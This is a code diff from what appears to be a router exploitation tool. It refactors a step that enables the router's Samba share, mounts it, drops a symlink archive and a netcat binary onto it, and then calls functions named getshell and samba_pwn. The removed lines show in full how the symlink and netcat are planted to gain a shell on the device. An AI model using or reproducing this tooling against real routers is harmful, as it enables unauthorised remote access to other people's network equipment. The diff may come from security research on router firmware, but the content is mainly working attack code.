@@ -6,7 +6,7 @@ import json
 import base64
 from hashlib import sha256
 from pages import login, lanstatus, samba_get, samba_post, ping_get, ping_post, traceroute_get, traceroute_post, download_get, download_post, macforkey_get,serialforkey_get
-from functions import encodepass, composekey, getlanip, prepare_payload, prepare_testsmb, getshell
+from functions import encodepass, composekey, getlanip, prepare_payload, prepare_testsmb, getshell, nousb_run
 from configdecryptor import configdec
 from samba import samba_pwn
 from time import sleep
@@ -16,8 +16,6 @@ from colorama import Style
 from colorama import init
 import sys
 import os
-import subprocess
-from time import sleep
 
 init()
 
@@ -61,25 +59,7 @@ if cmd == 1:
     if nousb == True:
         samba_post(r,host,post_token,"0","test","test")
         samba_post(r,host,post_token,"1","test","test")
-        print("[nousb]: Waiting 2 seconds for server startup...")
-        sleep(2)
-        subprocess.run(['mkdir','-p','dest'])
-        print("[nousb]: Created dest/ mountpoint")
-        a = subprocess.run(['mount','-t','cifs','-o','username=test,password=test,vers=1.0','\\\\192.168.0.1\\samba','dest'])
-        if a.returncode != 0:
-            print("[nousb]: Ensure that cifs-utils package is installed on the system or samba already mounted. Stopping")
-            exit(0)
-        print("[nousb]: Mounted router smb on dest/")
-        sleep(1)
-        subprocess.run(['unzip','-oqq','symlink.zip','-d','dest/'],capture_output=False, stderr=subprocess.DEVNULL)
-        print("[nousb]: Symlink copied")
-        subprocess.run(['cp','../bin/nc','dest/'])
-        print("[nousb]: Nc copied")
-        sleep(1)
-        subprocess.run(['umount','dest'])
-        print("[nousb]: Unmounted router smb")
-        subprocess.run(['rm','-rf','dest'])
-        print("[nousb]: Deleted dest/ mountpoint")
+        nousb_run(host)
     samba_post(r,host,post_token,"0","test","test")
     samba_post(r,host,post_token,"1","test","test")
     localip = getlanip()
